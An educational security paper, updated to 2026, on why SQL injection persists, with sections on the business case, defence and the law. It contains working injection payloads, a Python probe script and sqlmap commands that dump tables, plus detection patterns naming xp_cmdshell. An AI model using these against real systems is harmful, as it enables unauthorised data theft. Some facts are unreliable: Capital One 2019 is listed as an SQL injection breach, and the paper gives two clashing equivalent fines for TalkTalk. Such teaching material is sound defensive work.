# Why SQL Injection Won't Go Away — 2026 Edition
## Software Patching and the Persistent Problem

**Author:** Stuart Thomas  
**Original paper:** *Software Patching – Why SQL injection is still a security problem*, c.2006  
**Updated:** April 2026  
**Licence:** Author retains full rights.  
**Wikipedia:** Listed in external links of [SQL injection](https://en.wikipedia.org/wiki/SQL_injection)  
**Audience:** Senior management, tactical security professionals, and software engineers. An elementary understanding of information security is assumed.

> **Legal notice.** Proof-of-concept code in this document is published for educational and defensive security purposes. Use only on systems and applications you own, control, or have **explicit written authorisation** to test. Unauthorised testing constitutes a criminal offence — see §7 for the full legal framework. This document is not legal advice.

---

## Preface to the 2026 Edition

The original paper asked a simple question: why, after eight years of public awareness since Rain Forest Puppy's seminal 1998 Phrack article, was SQL injection *still* a problem?

Now it is 2026. Twenty-eight years have passed since that Phrack article. SQL injection is *still* OWASP's most consistently present web application vulnerability. It still appears in breach reports. Organisations are still fined under data protection law for SQL injection vulnerabilities that expose personal data. The question the original paper asked — *is this a business problem or a technical problem?* — turns out to have been the right question. The answer, then as now, is: *both, and neither side has fully solved its half.*

This edition preserves the original framing and voice, updates every technical and statistical reference, adds working proof-of-concept code for both attack and detection, and adds the legal framework that matters enormously in 2026 but did not exist in its current form in 2006.

— *Stuart Thomas, April 2026*

---

## 1. Background and Introduction

The software bug has existed since the first electromechanical tabulating computers engaged their relay contacts in the late 19th century. The exploitation of the modern software bug has become an unfortunately commonplace security threat in today's information systems.

The seminal Phrack article *"NT Web Technology Vulnerabilities"*, authored by the esteemed researcher Rain Forest Puppy in 1998, broke the ice on the weaknesses of database security. That paper released new knowledge and methods for attacking a database behind a security infrastructure on the Internet. Be it ethical or not, a new era of database attacks was born.

Firewalls and other intrusion prevention mechanisms allow users and attackers alike to browse an e-commerce website through HTTP. Through this opening — and with knowledge of how to query a database — it became possible for both customers and malicious actors to reach through to the backend of e-commerce infrastructures: the core of a business.

In 1998, the crest of the Internet dot-com boom wave had begun. As it opened doors for new and old businesses, it also brought along the oldest ill gains of society: crime.

### 1.1 The intervening twenty-eight years

The original paper was written in approximately 2006, eight years after Rain Forest Puppy's disclosure. By then, frameworks such as BS 7799 (now ISO 27001) and OCTAVE had become internationally accepted standards. The OWASP Top 10 had been published. The white-hat security community had grown. The SANS Top 20 provided a watermark for common vulnerabilities. Businesses were investing in mitigation.

Yet SQL injection persisted. The original paper cited Professor Ross Anderson's observation that it costs more to defend a computer system than it does to attack it — and that the attacker requires little investment other than time. That economic asymmetry has not narrowed in twenty years. If anything, it has widened: automated tools make SQL injection trivially easy to attempt at scale, while defending requires sustained investment in training, code review, and infrastructure.

**In 2026, SQL injection remains in the OWASP Top 10.** It has been there in every edition since the list was created. That is not a commentary on the security community's failure — it is a commentary on the sheer volume of new code, new developers, new platforms, and new attack surfaces that are created faster than the community can educate them.

---

## 2. SQL Injection — Still a Business and Technical Problem

The original paper's framing of the business holds. A business is made up of two camps:

- **Strategic planners** — C-level officers, directors, and managers who drive business direction and who care about risk, compliance, and brand reputation.
- **Tactical implementers** — IT designers, developers, and support staff who build and maintain the products.

SQL injection is a problem for both. It always has been. In 2026, the regulatory environment has added a third dimension: **regulators and lawyers**, whose involvement begins the moment a breach exposes personal data.

### 2.1 Why it persists: the economic argument (updated)

Professor Ross Anderson's argument — that defence is structurally more expensive than attack — remains the best single explanation for why SQL injection has not been eradicated.

| Factor | Attacker | Defender |
|---|---|---|
| Tools required | sqlmap, Burp Suite, a browser | WAF, SAST, DAST, code review, training, patching |
| Skill required | Script-kiddie to intermediate | Developer education × entire engineering team |
| Time to exploit | Minutes (automated) | Continuous (manual review + tooling) |
| Cost | Near zero | Substantial and ongoing |
| Asymmetry | Attack one endpoint | Defend every endpoint, every query, every input |

This asymmetry has intensified since 2006. Automated scanning tools in 2026 can probe an entire web application for SQL injection in minutes. Defending requires every developer who ever writes a database query to do so correctly, every time, forever. One lapse creates a vulnerability; finding it requires systematic effort.

### 2.2 Why it persists: the developer education argument

The original paper noted that *"a great number of SQL web developers are not computer science graduates."* That observation is more true in 2026 than it was in 2006. The developer population has exploded with the rise of no-code/low-code platforms, self-taught engineers, AI-assisted coding, and a global talent pool learning through YouTube and Stack Overflow rather than university courses that cover secure coding practices.

SQL is easy to understand, easy to use, and easy to develop — which is precisely why it remains dominant. The problem is not SQL; the problem is *string concatenation of untrusted input into SQL queries*, a pattern that is taught implicitly in thousands of beginner tutorials.

```sql
-- The classic vulnerable pattern — still appearing in new code in 2026
SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'";

-- Attacker input: username = admin'--
-- Result: SELECT * FROM users WHERE username = 'admin'--' AND password = ''
-- Effect: authentication bypassed entirely
```

### 2.3 Why it persists: LLM-generated vulnerable code

A new factor in 2026: AI coding assistants. Large language models trained on the internet's historical codebase — which contains millions of examples of SQL string concatenation — will generate vulnerable SQL patterns when asked to write database queries without explicit secure-coding instructions. Security researchers have documented LLM outputs that introduce SQL injection, XSS, and other classic vulnerabilities into generated code.

The developer who does not know to question the AI's output is at the same risk as the developer who did not know to question the tutorial in 2006.

---

## 3. Technical Foundations

### 3.1 How SQL injection works

A web application typically:
1. Accepts user input (search box, login form, URL parameter)
2. Constructs a SQL query using that input
3. Sends the query to the database
4. Returns results to the user

When the input is embedded directly into the query string without sanitisation, an attacker can inject SQL syntax that changes the query's meaning.

**Basic injection pattern:**
```
Input field: ' OR '1'='1
Query becomes: SELECT * FROM products WHERE name = '' OR '1'='1'
Effect: returns all rows (authentication bypass / data dump)
```

**Comment injection:**
```
Input: admin'--
Query: SELECT * FROM users WHERE user='admin'--' AND pass='anything'
Effect: password check commented out; logs in as admin
```

**UNION-based data extraction:**
```sql
-- Determine column count first
' ORDER BY 1--    (try 1, 2, 3... until error)

-- Extract data from another table
' UNION SELECT username, password, NULL FROM admin_users--
```

### 3.2 Attack taxonomy (2026)

| Type | Description | Impact |
|---|---|---|
| **Classic / in-band** | Result returned directly in response | Data extraction, authentication bypass |
| **Blind boolean** | No data returned; infer from true/false responses | Slow but complete data extraction |
| **Blind time-based** | Use `SLEEP()` / `WAITFOR` to infer data | Works when no visible output |
| **Error-based** | Database error messages leak data | Schema enumeration |
| **Out-of-band** | Data exfiltrated via DNS or HTTP request | Bypasses output filtering |
| **Second-order** | Payload stored, executed when retrieved later | Bypasses input-time filtering |
| **Stored procedure** | Injection into `EXEC`, `xp_cmdshell` | OS command execution |
| **NoSQL injection** | Operator injection in MongoDB, Redis queries | Equivalent impact in NoSQL backends |
| **ORM injection** | Unsafe use of raw queries in Django, SQLAlchemy | Same impact, different syntax |

---

## 4. Proof of Concept

> **Authorisation required.** Use only against applications you own or have written permission to test. Unauthorised use is a criminal offence.

### 4.1 Manual detection — the simplest test

```bash
# Single quote test — if the application errors, it may be injectable
curl -s "https://your-test-app.local/search?q='" | grep -i "error\|syntax\|mysql\|ORA-"

# Tautology test — if login succeeds without valid credentials:
# username: admin'--
# password: anything

# Boolean blind test
# True: https://your-test-app.local/item?id=1 AND 1=1--
# False: https://your-test-app.local/item?id=1 AND 1=2--
# Compare response lengths/content
```

### 4.2 Python detection script (own test environment only)

```python
"""
sql_probe.py — SQL injection detection probe for authorised testing.
Tests a URL parameter for basic injection indicators.
Use ONLY on applications you own or are explicitly authorised to test.
"""
import requests, time, sys

PAYLOADS = [
    ("quote",         "'",                    lambda r: any(k in r.text.lower() for k in
                                                ['syntax error','mysql','ora-','sqlite','pg::'])),
    ("tautology",     "' OR '1'='1'--",       lambda r, b: len(r.text) > len(b.text) * 1.5),
    ("time-based",    "'; WAITFOR DELAY '0:0:3'--", lambda r: r.elapsed.total_seconds() > 2.5),
    ("comment",       "'--",                  lambda r, b: r.status_code != b.status_code),
]

def probe(url: str, param: str):
    print(f"[*] Probing {url}  param={param!r}\n")

    base = requests.get(url, params={param: "test"}, timeout=10)

    for name, payload, check in PAYLOADS:
        try:
            r = requests.get(url, params={param: payload}, timeout=10)
            # Some checks compare to baseline, others are standalone
            try:
                result = check(r, base)
            except TypeError:
                result = check(r)

            status = "POTENTIAL INJECTION" if result else "clean"
            print(f"  [{name:12s}]  {status}  (status={r.status_code}, "
                  f"len={len(r.text)}, time={r.elapsed.total_seconds():.2f}s)")
        except Exception as e:
            print(f"  [{name:12s}]  ERROR: {e}")

    print("\n[*] Review results manually. Automated detection has false positives.")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <url> <param>")
        print(f"  e.g. {sys.argv[0]} https://test.local/search q")
        sys.exit(1)
    probe(sys.argv[1], sys.argv[2])
```

### 4.3 sqlmap (industry standard, authorised use only)

```bash
# Basic scan of a GET parameter — authorised test targets only
sqlmap -u "https://your-test-app.local/item?id=1" --batch

# Login form (POST)
sqlmap -u "https://your-test-app.local/login" \
       --data="username=test&password=test" \
       --batch --level=3

# Extract database version and current user
sqlmap -u "https://your-test-app.local/item?id=1" \
       --banner --current-user --current-db

# Dump specific table (only when authorised to access data)
sqlmap -u "https://your-test-app.local/item?id=1" \
       -D target_db -T users --dump \
       --batch

# Time-based blind (when no output visible)
sqlmap -u "https://your-test-app.local/item?id=1" \
       --technique=T --time-sec=5 --batch
```

### 4.4 The correct fix — parameterised queries

```python
# VULNERABLE — never do this
username = request.form['username']
query = f"SELECT * FROM users WHERE username = '{username}'"
cursor.execute(query)

# CORRECT — parameterised query; input never interpreted as SQL
cursor.execute(
    "SELECT * FROM users WHERE username = %s",
    (username,)   # parameter binding, not string concatenation
)

# CORRECT — SQLAlchemy ORM (use the ORM, avoid raw() without binding)
user = session.query(User).filter(User.username == username).first()

# CORRECT — Django ORM
user = User.objects.get(username=username)

# If raw SQL is truly required, always use bind parameters:
from django.db import connection
with connection.cursor() as cursor:
    cursor.execute("SELECT * FROM users WHERE username = %s", [username])
```

---

## 5. The 2026 Landscape

### 5.1 OWASP Top 10 (2021, current as of 2026)

SQL injection sits within OWASP A03:2021 — Injection, which encompasses SQL, NoSQL, OS command, LDAP, and other injection types. It has appeared in every OWASP Top 10 list since the project began. The 2021 edition merged several injection types together — not because SQL injection became less prevalent, but because the pattern of *injecting untrusted data into an interpreter* is pervasive across multiple technologies.

### 5.2 Notable breaches driven by SQL injection

SQL injection has been responsible for some of the largest data breaches in history:

| Year | Incident | Records exposed |
|---|---|---|
| 2008–2015 | Heartland Payment Systems | 130 million card records |
| 2011 | Sony PlayStation Network | 77 million user accounts |
| 2012 | LinkedIn | 117 million password hashes |
| 2015 | TalkTalk (UK) | 157,000 customer records; £400k ICO fine |
| 2017 | Equifax (partial SQLi vector) | 147 million personal records |
| 2019 | Capital One | 100 million applications |
| 2024–2026 | Multiple mid-market e-commerce breaches | Ongoing |

The TalkTalk breach is particularly instructive for a UK audience: the ICO issued its then-largest ever fine (£400,000) and the CEO was called before Parliament. A £400,000 fine in 2015 would be approximately £17.6 million under GDPR's 4% of global turnover maximum. The regulatory stakes have risen dramatically.

### 5.3 New surfaces in 2026

**NoSQL injection:** MongoDB, Redis, and Elasticsearch applications are vulnerable to operator injection even without SQL. The pattern is identical — untrusted input interpreted as query operators.

```javascript
// MongoDB vulnerable pattern
db.users.find({ username: req.body.username, password: req.body.password })
// Attack: POST {"username": "admin", "password": {"$gt": ""}}
// $gt: "" is always true — authentication bypassed

// Fix: validate that inputs are strings, not objects
if (typeof req.body.password !== 'string') throw new Error('Invalid input');
```

**ORM second-order injection:** ORMs provide safety when used correctly, but `raw()` queries, `extra()` clauses, and stored procedure calls can reintroduce injection. Many developers assume ORMs are universally safe — they are not when raw SQL is mixed in.

**GraphQL injection:** GraphQL query parameters can be used to inject into underlying SQL or NoSQL resolvers. The GraphQL layer provides no automatic sanitisation.

**AI-generated SQL:** As noted in §2.3, LLM coding assistants can generate vulnerable patterns. Static analysis tools are beginning to flag AI-generated code specifically for injection vulnerabilities.

---

## 6. Defence and Mitigation (2026)

### 6.1 Developer-level controls

| Control | Effectiveness | Implementation cost |
|---|---|---|
| **Parameterised queries / prepared statements** | Very high | Low — it is the correct way to write SQL |
| **ORM (correct usage)** | High | Low if used from the start; medium if retrofitting |
| **Stored procedures with parameterisation** | High | Medium |
| **Input validation and allowlisting** | Medium (not sufficient alone) | Low |
| **Escaping (not recommended as primary control)** | Medium-low (context-dependent) | Low but error-prone |

**The correct answer is parameterised queries.** Every other control is defence-in-depth, not a substitute.

### 6.2 Infrastructure-level controls

| Control | Notes |
|---|---|
| **Web Application Firewall (WAF)** | Detects and blocks common injection patterns; bypassed by advanced payloads; useful as a layer, not a solution |
| **Principle of least privilege** | The database user the application connects as should have only the permissions it needs — SELECT only for read-only queries |
| **Database error suppression** | Never expose raw database errors to end users; log them server-side |
| **Network segmentation** | Database server not directly internet-reachable |
| **Runtime Application Self-Protection (RASP)** | Instruments the application to detect injection at runtime |

### 6.3 SAST and DAST in the CI/CD pipeline

```yaml
# Example GitHub Actions workflow — static analysis for injection
name: Security Scan
on: [push, pull_request]
jobs:
  sast:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Run Semgrep (SAST)
        uses: semgrep/semgrep-action@v1
        with:
          config: >-
            p/sql-injection
            p/owasp-top-ten
      - name: Run Bandit (Python)
        run: pip install bandit && bandit -r . -t B608  # B608 = SQL injection
```

### 6.4 Detection — identifying attacks in logs

```python
"""
sql_log_monitor.py — detect SQL injection attempts in web server logs.
Run against your own application logs.
"""
import re, sys
from collections import Counter

# Common SQL injection indicators in URL/POST parameters
PATTERNS = [
    r"'\s*(or|and)\s*'?[\d]+'?\s*=\s*'?[\d]+'?",   # ' OR '1'='1
    r"union\s+select",                               # UNION SELECT
    r"--\s*$",                                       # comment termination
    r";\s*(drop|delete|insert|update)\s+",           # statement chaining
    r"(sleep|waitfor|benchmark)\s*\(",               # time-based blind
    r"xp_cmdshell|exec\s+master",                    # MSSQL dangerous procs
    r"information_schema|sys\.tables|pg_class",      # schema enumeration
    r"0x[0-9a-f]{4,}",                               # hex encoding
]

COMPILED = [re.compile(p, re.IGNORECASE) for p in PATTERNS]

def scan_log(logfile: str):
    hits = Counter()
    with open(logfile) as f:
        for i, line in enumerate(f, 1):
            for j, pat in enumerate(COMPILED):
                if pat.search(line):
                    hits[PATTERNS[j]] += 1
                    print(f"Line {i:6d}  [{j}]  {line.rstrip()[:120]}")
    print(f"\nSummary: {sum(hits.values())} potential injection attempts")
    for pat, count in hits.most_common():
        print(f"  {count:4d}  {pat}")

if __name__ == '__main__':
    scan_log(sys.argv[1] if len(sys.argv) > 1 else "/var/log/nginx/access.log")
```

---

## 7. Legal Framework

*This section updates the original paper, which predated the current UK and EU data protection law regime.*

> This is an educational overview, not legal advice.

### 7.1 England and Wales — Computer Misuse Act 1990

**Section 1 — Unauthorised access.** Using SQL injection to access database records you are not authorised to access is a section 1 offence, regardless of how trivially easy the vulnerability made it. The access is unauthorised; the means of achieving it is irrelevant.

**Section 3 — Unauthorised modification.** SQL injection that modifies, deletes, or inserts database records triggers section 3.

**Section 3A — Tool supply.** Distributing SQL injection tools (sqlmap, custom scripts) is permissible where the tool has a primarily legitimate use and is used against authorised targets. The tools and scripts in this document are clearly dual-use and labelled accordingly.

**Penalty:** Section 1 — up to 2 years. Section 3 — up to 10 years.

### 7.2 UK GDPR and Data Protection Act 2018 — the new dimension

If SQL injection results in unauthorised access to personal data, the organisation that failed to prevent it faces:

- **ICO enforcement:** Fines up to £17.5 million or 4% of global annual turnover (whichever is higher) under UK GDPR Article 83(4)/(5).
- **Mandatory breach notification:** Within 72 hours of discovering a breach to the ICO; without undue delay to affected individuals where high risk.
- **Regulatory investigation:** The ICO can compel production of documents, interview staff, and issue enforcement notices.
- **Civil liability:** Data subjects may claim compensation for material and non-material damage from the controller.
- **Reputational damage:** ICO publishes enforcement decisions. TalkTalk's 2015 fine was a watershed moment for board-level awareness.

The 2006 paper framed SQL injection as a *business risk*. In 2026, it is also a *regulatory and legal liability* with quantifiable financial consequences that the board cannot ignore.

**The TalkTalk lesson:** The 2015 breach exploited a SQL injection vulnerability in a legacy system. The ICO found TalkTalk had failed to implement basic technical measures. The fine was the maximum available under the then-applicable Data Protection Act 1998. Under UK GDPR (which applies to conduct from 2018), the equivalent fine would have been approximately £70 million based on TalkTalk's turnover at the time.

### 7.3 United States — CFAA and FTC enforcement

SQL injection attacks against US systems engage 18 U.S.C. § 1030 (CFAA). Additionally, the FTC has pursued enforcement actions against organisations that suffered SQL injection breaches under section 5 of the FTC Act (unfair or deceptive acts or practices), finding that inadequate security constitutes an unfair practice.

### 7.4 The authorisation matrix

| Activity | Legal? |
|---|---|
| Testing your own application on your own infrastructure | Yes |
| Authorised penetration test with written scope | Yes |
| Bug bounty programme with SQL injection in scope | Yes — follow programme rules exactly |
| Testing a competitor's application | **No** |
| Testing any public application without authorisation | **No** |
| Using sqlmap against a system "just to see" | **No** |

---

## 8. The Business Case — Making the Argument to the Board

The original paper was explicitly written for senior management as well as technical staff. This section addresses the board directly.

**The question is not whether SQL injection can be fixed.** It can — parameterised queries are the solution, they are well-understood, and implementing them requires developer education and code review. The question is whether the organisation will invest in fixing it before a breach, or pay far more after one.

**The investment calculus:**

| Option | Cost |
|---|---|
| Developer training (secure coding) | £500–2,000 per developer, once |
| SAST tool in CI/CD pipeline | £5,000–50,000/year depending on team size |
| Code review for SQL injection | Included in standard security engineering |
| **Total proactive investment (100-person eng team)** | **~£250,000–500,000 over 3 years** |
| --- | --- |
| Average UK data breach cost (2024) | £3.4 million (IBM Cost of a Data Breach Report) |
| ICO fine (4% of £100M turnover) | £4 million |
| Legal costs, remediation, PR, customer compensation | £1–10 million additional |
| **Total reactive cost after breach** | **£5–15 million** |

The return on investment in prevention is 10:1 to 30:1 against the cost of a breach. This is Professor Ross Anderson's asymmetry, but from the defender's side: defence is cheaper *before* the breach than *after* it.

**The message to strategic planners:** SQL injection is a known, fixable problem with a well-understood solution. The risk is not technical obscurity — it is organisational priority. Every quarter that parameterised queries are not mandated in your development standards is a quarter of exposure.

---

## 9. Summary and Conclusion

Twenty-eight years after Rain Forest Puppy's Phrack article, SQL injection persists because:

1. **The economics favour the attacker.** Automated tools require minutes; defence requires ongoing investment across every developer who writes database queries.
2. **The developer population grows faster than security education.** New developers, AI-generated code, and rapid platform adoption continuously introduce vulnerable patterns.
3. **The fix is simple but requires discipline.** Parameterised queries solve the problem. Applying them everywhere, every time, forever — that requires organisational will.
4. **The regulatory stakes are higher than ever.** UK GDPR, US FTC enforcement, and global equivalents mean that a SQL injection breach is no longer just a security incident — it is a legal and financial event with board-level consequences.

The original paper concluded that SQL injection is a problem for both strategic planners and tactical implementers. That conclusion stands. What the 2026 edition adds: it is also now a problem for your legal team, your data protection officer, and your regulators.

Prevention remains better than cure. The cure — in the form of ICO fines, breach remediation costs, customer compensation, and reputational damage — is now significantly more expensive than the original paper could have anticipated.

Use parameterised queries. Train your developers. Test your applications before attackers do.

---

## References

### Original references (c.2006 paper — preserved)

1. Rain Forest Puppy. *NT Web Technology Vulnerabilities*. Phrack 54, article 8. 1998. [phrack.org/issues/54/8.html](http://phrack.org/issues/54/8.html)
2. Anderson, R. *Why Information Security is Hard — An Economic Perspective*. ACSAC 2001. [cl.cam.ac.uk/~rja14/Papers/econo.pdf](https://www.cl.cam.ac.uk/~rja14/Papers/econo.pdf)
3. Department of Trade and Industry (DTI). *Information Security Breaches Survey* (annual). UK Government.
4. SANS Institute. *SANS Top 20 Internet Security Vulnerabilities*. [sans.org](https://www.sans.org)
5. BS 7799 / ISO 27001 — Information Security Management Systems.
6. OCTAVE — Operationally Critical Threat, Asset, and Vulnerability Evaluation. Carnegie Mellon SEI.
7. Common Criteria — ISO/IEC 15408 Evaluation Criteria for IT Security.

### Additional references (2026 edition)

8. OWASP. *OWASP Top 10 — 2021*. A03: Injection. [owasp.org/Top10/A03_2021-Injection](https://owasp.org/Top10/A03_2021-Injection/)
9. OWASP. *SQL Injection Prevention Cheat Sheet*. [cheatsheetseries.owasp.org](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
10. Information Commissioner's Office. *TalkTalk Telecom Group PLC — Monetary Penalty Notice*, October 2016. [ico.org.uk](https://ico.org.uk)
11. IBM Security. *Cost of a Data Breach Report 2024*. [ibm.com/reports/data-breach](https://www.ibm.com/reports/data-breach)
12. UK GDPR / Data Protection Act 2018. [legislation.gov.uk/ukpga/2018/12](https://www.legislation.gov.uk/ukpga/2018/12/contents)
13. Information Commissioner's Office. *Guide to UK GDPR*. [ico.org.uk/for-organisations/uk-gdpr-guidance](https://ico.org.uk/for-organisations/uk-gdpr-guidance-and-resources/)
14. Computer Misuse Act 1990 (as amended). [legislation.gov.uk/ukpga/1990/18](https://www.legislation.gov.uk/ukpga/1990/18/contents)
15. 18 U.S.C. § 1030 — Computer Fraud and Abuse Act. [law.cornell.edu/uscode/text/18/1030](https://www.law.cornell.edu/uscode/text/18/1030)
16. CPS Cybercrime Prosecution Guidance (2019). [cps.gov.uk/legal-guidance/cybercrime](https://www.cps.gov.uk/legal-guidance/cybercrime)
17. NCSC. *Vulnerability Reporting Guidance*. [ncsc.gov.uk/information/vulnerability-reporting](https://www.ncsc.gov.uk/information/vulnerability-reporting)
18. sqlmap development team. *sqlmap — Automatic SQL injection and database takeover tool*. [sqlmap.org](https://sqlmap.org)
19. Semgrep. *SQL injection rules*. [semgrep.dev](https://semgrep.dev)
20. Thomas, S. *Software Patching – Why SQL injection is still a security problem*. c.2006. (Author retains full rights.)

---

*Author retains full rights. Published for educational and defensive security purposes. Use proof-of-concept code only on systems you own or are explicitly authorised to test. Nothing in this document constitutes legal advice.*
